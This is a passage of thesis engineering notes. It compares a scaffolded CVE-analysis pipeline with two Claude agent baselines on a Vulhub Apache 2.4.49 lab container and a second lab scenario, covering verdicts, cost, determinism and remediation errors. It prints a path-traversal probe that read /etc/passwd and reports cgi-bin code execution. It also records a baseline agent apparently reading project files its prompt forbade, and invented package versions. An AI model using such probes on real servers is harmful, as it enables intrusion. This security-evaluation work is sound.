The experiment was framed to answer both together: pick one Vulhub
scenario, run the full v2 chain on it, then run two Claude-only
baselines on the same target, and compare.

### 12.2 Target

`vulhub/httpd/CVE-2021-41773` — Apache 2.4.49 built from source into
`/usr/local/apache2/`, running inside `vulhub/httpd:2.4.49` on
**Debian 10 buster**, port 8080 exposed. Known-vulnerable: path
traversal + optional mod_cgi RCE. The container has `dpkg` but **no
`python3`** — informs the sec-agent-target build decision below.

### 12.3 v3-0 sub-chunk: `sec-agent-target` static binary

Before running the experiment, built a self-contained Linux executable
that wraps host-scanner's self-scan subset — needed because the Vulhub
container has no Python runtime.

- **Build infra:** Docker, `python:3.9-slim-buster` (glibc 2.28, covers
  every Vulhub-era Debian). PyInstaller --onefile with explicit
  `hiddenimports` for the six self-scan scanners.
- **manylinux2014 was tried first** (glibc 2.17, ideal compat target)
  but rejected: its Python is statically linked and PyInstaller refuses
  to build against it. Lesson for v3-1 musl variant: skip manylinux,
  pick the oldest glibc base image that ships a shared libpython.
- **buster's apt repos are EOL** — fix by `sed`-rewriting
  `/etc/apt/sources.list` to `archive.debian.org` before installing
  binutils (needed by PyInstaller even with `strip=False`).
- **Lazy-httpx refactor in `host-scanner/scanners/software.py`** —
  moved `import httpx` from module top into the `_check_versions`
  function body. Zero behaviour change, shaves ~5MB off the frozen
  bundle. (Tests still green.)
- **Output:** `target-agent/dist/sec-agent-target` — 5.5MB ELF, glibc
  2.28, dynamically linked, Python 3.9.17 interpreter bundled.
- **Verified against the Vulhub Apache container:** dropped in via
  `docker cp`, ran via `docker exec`, produced valid host.json with
  110 dpkg packages and all six scanner sections populated. No apt
  install, no bind mount, no sys.path dance required.

Trust-model win: operator hands target one signed artifact rather than
"install Python and bind-mount our code."

### 12.4 Experiment setup

Three systems, same target, same deliverable schema (verdict + narrative
+ remediation per CVE), same model class (Claude Sonnet 5.5):

| System | Inputs available | Access | Scaffolding |
|---|---|---|---|
| **v2** | `host.json` + `network_state.json` | None (pure analysis) | host-scanner → cve-matcher (KEV + version-range) → exposure-analyzer |
| **Baseline 2** (raw Claude) | same `host.json` + `network_state.json` | None | None — one `claude -p` call with the inputs inlined |
| **Baseline 1** (pure Claude) | just the container name | `docker exec` shell + HTTP | None — general-purpose Agent with 30-command budget |

### 12.5 Results (verdicts side-by-side)

| CVE | v2 | Baseline 2 | Baseline 1 |
|---|---|---|---|
| **CVE-2021-41773** (Apache 2.4.49 path traversal) | **MISS** — matcher produced no candidate; dpkg does not see from-source Apache | CONFIRMED from banner, flagged dpkg/from-source caveat | **CONFIRMED + empirically exploited** (curl `/icons/..%2f..%2f..%2fetc/passwd` returned `/etc/passwd`; cgi-bin RCE returned `uid=1(daemon)`) |
| **CVE-2021-42013** (Apache 2.4.49/50 chain, bonus KEV entry) | MISS — same gate | CONFIRMED from banner | not surfaced |
| **CVE-2014-6278** (Shellshock on bash 5.0-4) | **MITIGATED_BY_CONFIG** — correctly rejected the fuzzy KEV FP, cited "bash 5.0 is post-fix for Shellshock lineage" | not surfaced | not surfaced (never scanned dpkg) |

### 12.6 Cost / wall-time

| System | Tool calls / turns | Wall time | Approximate cost |
|---|---|---|---|
| v2 (analyzer only, no narratives/remediations since no CONFIRMED) | 1 call | ~5 s | ~$0.02 |
| Baseline 2 (`claude -p`) | 10 turns | 151 s | **$1.00** (109k cache-create + 433k cache-read + 14k output) |
| Baseline 1 (general-purpose Agent) | 9 tool uses | 63 s | ~$0.20 (67k tokens) |

Baseline 2 is ~50× v2's cost on this scenario, driven by cache-reads of
the full 38 KB prompt across 10 turns.

### 12.7 Where v2's scaffolding helps

1. **FP rejection with grounded reasoning.** cve-matcher produced a
   fuzzy KEV hit of score 98 (bash → Shellshock). The analyzer applied
   the library-CVE version-fix rule (v2-5b prompt) and emitted
   `MITIGATED_BY_CONFIG` with `evidence.fix_boundary` naming the exact
   bash patch level. Baseline 1 skipped dpkg entirely and never faced
   this test; Baseline 2 also missed it in the inputs.
2. **Schema fidelity.** v2 produced JSON per the published schema. The
   downstream HTML report, attack-simulator, fix-publisher all consume
   that schema unchanged. Baseline 1 produced schema-conformant JSON.
   Baseline 2 **failed schema** — it treated the prompt as a Claude
   Code task, hit a non-interactive permission barrier, and returned
   prose instead.
3. **Remediation safety.** Not exercised here (zero CONFIRMED verdicts
   meant fix-publisher never ran). The six hard constraints
   (apt-only, pinned version, no chaining, no shell substitution, no
   pipes/redirects, no sudo) + the `_FORBIDDEN_METACHARS` validator
   added in v2-14 remain untested on this scenario — Baseline 1's
   remediation (`apt install apache2=2.4.51-1~deb11u1`) was
   wrong-distro and would have been accepted by v2's constraints
   because the constraints are structural, not semantic.

### 12.8 Where v2's scaffolding hurts

1. **Matcher gate causes from-source blindness.** The exposure-analyzer
   had the Apache 2.4.49 banner in its `network_state.json` input and
   even mentioned it inside the Shellshock verdict's reason text — but
   it cannot *raise* a new CVE candidate, only reason about ones
   cve-matcher produced. Baseline 1 took two curl probes to catch what
   v2 architecturally cannot see. This is the single biggest gap this
   experiment surfaced.
2. **KEV-only inventory.** Even if cve-matcher had seen Apache in dpkg,
   it would only have raised the CVE if it were in CISA KEV.
   CVE-2021-41773 is in KEV; CVE-2021-42013 is in KEV (both lucky);
   CVE-2017-7529 (nginx) is not and would have been invisible.
   Non-KEV CVEs are a known blindspot.

### 12.9 Where Baseline 1's lack of scaffolding hurts

1. **Wrong-distro remediation.** Baseline 1 proposed
   `apt install apache2=2.4.51-1~deb11u1` — a Debian 11 pin for a
   Debian 10 target. Baseline 2 got the distro right
   (`apache2=2.4.38-3+deb10u7`, which is a valid Debian 10 security
   backport that includes the CVE-2021-41773 fix). v2's fix-publisher
   grounds remediation in `host-scanner`'s OS detection via the prompt
   — if it had been given a CONFIRMED Apache verdict here, it would
   have had the correct distro context.
2. **Running Apache is from-source, not apt.** Both baselines proposed
   `apt install apache2=...` + `service apache2 restart` as the fix.
   The *running* Apache is `/usr/local/apache2/bin/httpd`; the apt
   package `apache2` is not installed. Applying either remediation
   would leave the vulnerable binary running while starting a
   different (nonexistent) apt-managed one. v2 would have the same
   gap today (fix-publisher is also apt-only) — this is a shared
   failure mode, not a scaffolding win or loss.
3. **No systematic inventory scan.** Baseline 1 fingerprinted via
   banner and attacked. It did not look at dpkg, and so it did not
   face (and could not reject) the Shellshock FP that cve-matcher
   raised. Over many targets, this becomes a measurable coverage
   difference, not a one-scenario oddity.

### 12.10 Experimental limitations

1. **One Vulhub scenario, one base-image family.** Generalizability to
   nginx-from-source, OpenSSL in TLS banners, PHP-FPM, Java-in-Tomcat,
   etc. is unproven. v3-6 (comparison harness) is scoped to re-run
   this experiment across a corpus.
2. **Baseline 2 cwd contamination.** `claude -p` ran with the
   project tree accessible; the reply references
   `eval-lab/reports/eval-web-vuln/` by path, suggesting it read v2's
   pre-existing eval-lab artifacts despite the prompt forbidding
   `C:\Users\ideal\project\` reads. A clean re-run should chroot the
   agent into a scratch directory.
3. **Baseline 1 trail not captured.** The agent returned verdicts
   inline instead of writing the requested trail file. We know the
   final answer and the tool-use count but not the per-command
   rationale. A `--write-trail` wrapper for future runs would fix
   this.
4. **No multi-run noise check.** Each baseline was a single sample.
   v2's v2-5b work documented sampling noise on Sonnet; the
   baselines were not stability-run.
5. **No "pure Claude agent with same inputs" cell.** The 2×2 of
   {inputs: pre-collected vs shell-access} × {scaffolding: on vs off}
   has one corner missing. v3-6 should fill it.

### 12.11 Thesis-defense framing

The three-way shows v2 and an unrestricted agent are **complementary**,
not substitutes:

- **v2** is the *safe second-pair-of-eyes*: schema-constrained,
  grounded in collected evidence, deterministic enough to audit,
  idempotent re-runs. Good at REFUSING a false candidate with a cited
  reason.
- **An unrestricted agent** is the *fast first-pass pentester*:
  banner → known-exploit, two commands to confirm. Good at CATCHING
  a reachable known-exploit when it's in training knowledge.

Different coverage patterns and different failure modes. The thesis
positioning is "principled analysis layer on top of (optional) agentic
exploration," not "replacement for an agent." That framing survives
the committee's "why not just use an agent?" question.

### 12.12 Improvement roadmap (v3 chunk seeds)

Ordered by expected ROI for the thesis demo:

- **v3-1: Banner-sourced candidates → analyzer.** Let the analyzer
  consume `network_state.json` service_guess records as *candidate
  sources*, not just evidence. One prompt change + one adapter in
  `exposure-analyzer/exposure_analyzer/candidates.py`. Would close
  the from-source gap. Does not require rebuilding cve-matcher.
- **v3-2: NVD CPE engine on cve-matcher.** Second inventory source
  alongside KEV. Closes the "non-KEV CVE blindspot" so a Vulhub
  scenario like nginx CVE-2017-7529 (non-KEV) would also surface.
  Larger lift — needs CPE normalization, caching, rate-limit
  handling.
- **v3-3: Agentic verification layer (opt-in).** After a `CONFIRMED`
  verdict, run a bounded agent (budget ≤5 shell commands, structured
  argv HITL gate) that empirically probes the target to confirm or
  demote. Baseline 1 showed this is cheap and informative. Keeps
  v2's safety layer in front.
- **v3-4: musl variant of sec-agent-target.** Second build target
  for Alpine / scratch-based containers. Not glibc-compatible, so
  needs its own build. ~1 hour.
- **v3-5: `fix-publisher` from-source awareness.** When
  `host-scanner` detects running binaries outside `dpkg -S` ownership,
  suppress apt-only remediation and emit a flagged advisory
  ("binary at /usr/local/..., not apt-managed; manual patch
  required").
- **v3-6: Three-way comparison harness.** Reusable `scripts/compare.py`
  that runs v2 + both baselines across a Vulhub (and VulnLab,
  OWASP-WrongSecrets, HackTheBox-Starting-Point) corpus and emits
  a per-scenario diff. Produces the next tranche of numbers for
  the thesis.

### 12.13 Reproducibility

Full artifacts: `scratchpad/vulhub-httpd-cve-2021-41773/` (gitignored
by default — these are per-run outputs, not canonical fixtures). Key
files:

- `host.json` — produced by `target-agent/dist/sec-agent-target`
- `network_state.json` — hand-crafted from the observed Apache banner
  (nmap unavailable on this Windows host; v3-6 harness should bundle
  nmap in the eval-attacker container)
- `candidates.json`, `host-state.json` — produced by
  `scratchpad/run_vulhub_chain.py` (one-off orchestrator; promote
  to `eval-lab/run_vulhub_scan.py` as part of v3-6)
- `verdicts.json` — v2's output
- `baseline1_pure_claude_verdicts.json` — Baseline 1's output
- `baseline2_raw_response.json` + `baseline2_raw_text.md` —
  Baseline 2's output
- `COMPARISON_notes.md` — field notes written during the run (seed
  for this §12)

### 12.14 Tier A follow-up: multi-run stability + second scenario (2026-10-01)

The §12.1-§12.13 result was n=1 scenario, n=1 run per system — enough
to seed v3 but not to make a defensible claim. Tier A ran 3× multi-run
of all three systems on the §12.2 Vulhub Apache target plus a single
run on a second scenario (eval-cms-plugin) where v2 was expected to
have an inventory-breadth advantage.

#### 12.14.1 Setup additions over §12

- Baseline-2 now runs from an **empty temp dir** (`scratchpad/tier_a_multirun/clean_cwd/b2_run{1,2,3}/`), not the project root — closes the contamination documented in §12.10.
- Baseline-1 prompt rewritten to require an **inline `trail` array** in the response JSON — the §12 run returned verdicts but skipped the separate trail-write; the inline format is unmissable. Trails captured for all four reruns.
- v2 analyzer rerun 3× with identical inputs — measures Sonnet's within-system verdict stability under same-prompt same-candidate.
- Second scenario: `eval-cms-plugin` (from the project's own eval-lab) — apt-visible libssl1.1 1.1.1d-0+deb10u6 (pre-fix) + apache2 2.4.38-3+deb10u4. v2 produced CONFIRMED verdicts on both OpenSSL CVEs in v2-13; the question is whether the baselines surface the same.

#### 12.14.2 Multi-run stability — Vulhub Apache

| System | Verdict determinism (3 reruns) | Output-schema compliance | Remediation version correctness | Avg cost / run | Avg wall / run |
|---|:-:|:-:|:-:|:-:|:-:|
| v2 analyzer | 3/3 identical (`MITIGATED_BY_CONFIG` for Shellshock bash FP) | 3/3 strict JSON | n/a (no CONFIRMED to remediate) | $0.02 | 5s |
| Baseline-1 (shell agent) | 3/3 identical ({41773, 42013} both CONFIRMED each run) | 3/3 strict JSON incl. inline trail | 3/3 correct Debian 10 pin (`-deb10u7` × 2, `-deb10u8` × 1 — both valid security backports) | $0.19 | 72s |
| Baseline-2 (one-shot) | **2/3 — one verdict flipped** (CONFIRMED×2 vs MITIGATED_BY_EXPOSURE×1) | **0/3 strict JSON — all have prose wrappers** | 1/3 correct, 1/3 **hallucinated** (`2.4.62-1~deb10u1` never existed), 1/3 upstream-untagged (`2.4.51-1`) | $0.76 | 149s |

The §12 single-run Baseline-1 result (wrong-distro `-deb11u1`, missed CVE-2021-42013) was an outlier. 3/3 reruns got the distro right AND surfaced both CVEs — the §12 anecdote understated Baseline-1's recall and overstated its remediation error rate.

Baseline-2 is the opposite — the §12 run was the *best* Baseline-2 produced. Clean-cwd reruns revealed both the verdict instability and three distinct remediation hallucination/formatting failure modes across three identical-input calls.

**The scaffolding's determinism advantage is now empirical, not inferred.** v2 produces the same structured verdict across runs with ~5-second analyses; Baseline-2 produces different verdicts across identical-input calls while costing ~38× more per call.

#### 12.14.3 Scenario-two coverage divergence — eval-cms-plugin

eval-cms-plugin is a Debian 10 container with WordPress + Apache 2.4.38 (apt-installed) + libssl1.1 1.1.1d-0+deb10u6 (apt-installed, pre-fix for CVE-2022-0778 and CVE-2021-3711). v2's v2-13 run produced 9 verdicts including 2 CONFIRMED (both OpenSSL CVEs) with version-grounded reasoning.

| System | CVEs surfaced | CONFIRMED | What drove the pick |
|---|---|:-:|---|
| v2 | CVE-2014-0160, CVE-2014-6278, CVE-2017-8291, CVE-2021-40438, CVE-2021-42013, **CVE-2022-0778**, **CVE-2021-3711**, CVE-2021-44228, CVE-2023-38408 (9) | 2 (OpenSSL) | cve-matcher fuzzy-matched KEV catalog entries against dpkg inventory; analyzer verdicted each |
| Baseline-1 (shell) | **CVE-2022-22720** (CONFIRMED Apache request smuggling), CVE-2022-22721, CVE-2022-26377, CVE-2023-25690, CVE-2024-38475 (5) | 1 (Apache smuggling) | Agent enumerated apache config + loaded modules; CVE picks came from training knowledge of Apache advisories, 32-bit vs 64-bit arch check, mod_proxy_ajp enablement check, RewriteRule presence check |
| Baseline-2 (one-shot) | CVE-2017-9798, CVE-2019-0211, CVE-2021-40438 (3) | 0 | Pattern-matched host.json inventory against training-known CVEs |

**Zero CVE overlap between v2 and Baseline-1.** One CVE overlap between v2 and Baseline-2 (CVE-2021-40438). Baseline-1 and Baseline-2 overlap zero.

This is the paper's load-bearing graphic: three AI-pentest setups on the same target produce three essentially disjoint vulnerability sets. "Which LLM / which scaffolding" dominates "what CVEs you find" — far more than within-system noise. The v2 vs no-v2 question is not "does scaffolding squeeze a few more percent of recall?" but "**scaffolding changes what the system can see at all.**"

Specifically:
- v2's **OpenSSL finds** (CVE-2022-0778, CVE-2021-3711) are reachable only through a dpkg-aware inventory-first pass; Baseline-1 ran `dpkg -l | grep -E 'apache2|php|openssl|...'` in trail step 5 but **chose not to raise OpenSSL CVEs** — not out of lack of information, out of lack of KEV-triggered pattern.
- Baseline-1's **Apache request-smuggling finds** are reachable only through a module-and-arch-aware runtime inspection; v2's cve-matcher doesn't surface those CVEs because they're not KEV-listed.
- Baseline-2's picks look driven by banner + inventory recognition without any active probing; it misses what either scaffold-driven dpkg matching OR shell-driven module inspection catches.

#### 12.14.4 Observations across both scenarios

1. **Determinism is where v2 wins hardest.** v2's 3-run verdict agreement is 100% on Vulhub Apache (prose varies, decision doesn't). Baseline-2's is 67% with one verdict flip; Baseline-1's is 100% on verdicts but with lexical variation in remediation version pins (deb10u7 vs deb10u8). For a committee asking "would two runs of your tool give me the same answer?", v2's answer is cleanly yes.

2. **Output-schema compliance is the second-widest gap.** 0/3 of Baseline-2's calls returned strict JSON; every reply had prose preamble about file-write permissions or epistemic hedging. 3/3 of v2's and Baseline-1's did. For a pipeline consumer that needs parseable JSON (reports, downstream tools), the one-shot route is unreliable even on an identical prompt.

3. **Coverage divergence between systems is far larger than divergence within a system.** The §12.14.3 table has zero CVE overlap between v2 and Baseline-1. Two "ask Claude to find CVEs" setups on the same target produce completely different vulnerability lists. **This argues strongly against the "just use an agent" position** — not because an agent is bad, but because *which* agent configuration dominates the result and no single agent configuration gives full coverage.

4. **Scaffolding changes failure modes, not just success modes.** v2 misses CVE-2021-41773 (from-source blind, §12.5). Baseline-1 misses CVE-2022-0778 (dpkg-known pre-fix libssl1.1, caught by v2). Baseline-2 misses CVE-2022-0778 AND CVE-2022-22720. Each system has its own blind spots; v3 architecture should seek to *compose* the strengths (dpkg-aware inventory + banner-aware candidate raising + opt-in agentic verification), not pick one.

5. **Remediation safety is a real finding, not a hypothetical.** Across 7 baseline runs:
   - 2 contained hallucinated version pins that would fail on `apt install` (never-existed `2.4.62-1~deb10u1`, wrong-distro `2.4.51-1~deb11u1`)
   - 7/7 contained `&&` chain operators that v2's `fix-publisher` validator rejects structurally
   - 1 contained no distro-specific version string at all (upstream `2.4.51-1`)
   An operator pasting any of these into a Debian 10 shell would either get apt-not-found-package errors or install the wrong binary.

#### 12.14.5 Updated improvement roadmap (refines §12.12)

With the Tier A data in hand, the v3 ordering tightens:

- **v3-1 Banner-sourced candidates → analyzer** stays top priority. Closes the §12.5 gap with a surgical change. New success gate: v2 catches CVE-2021-41773 in 3/3 reruns.
- **v3-3 Agentic verification layer** moves ahead of v3-2 in priority. §12.14.3 shows the shell-driven coverage is complementary to dpkg-driven coverage — not duplicative. Opt-in agentic verify on `CONFIRMED` verdicts turns v2 into a superset. New success gate: on eval-cms-plugin, v3-v2+verify catches both v2's OpenSSL CVEs AND Baseline-1's CVE-2022-22720.
- **v3-6 comparison harness** stays priority 3, but now with real multi-run and multi-scenario data patterns to automate.
- **v3-2 NVD CPE engine** demoted — the KEV blindspot matters, but §12.14.3 shows a bigger gap closes via v3-1 + v3-3.

#### 12.14.6 Known Tier-A limitations

1. **Only 2 scenarios.** Vulhub Apache + eval-cms-plugin. Need v3-6 harness for the ~10-scenario corpus a defendable paper requires.
2. **Baseline-2's prose-wrapper problem may be a `claude -p` artifact, not a Sonnet artifact.** The CLI treats the input as a Claude Code task and burns turns on permission errors. A direct Anthropic API call with the same prompt might behave differently. Worth a one-time apples-to-apples check.
3. **Baseline-1's "did it probe for OpenSSL" negative is one data point.** Three reruns of Baseline-1 on cms-plugin would clarify whether that's deterministic. Deferred to Tier B.
4. **No negative-control (clean container) run yet.** Scheduled for Tier B.
5. **Multi-run cost: ~$6 total.** Comparable scale to a single v2-13 full eval. Full Tier B at the planned ~10-scenario corpus is ~$30-50; still cheap vs the thesis-defense value, but worth a budget line.

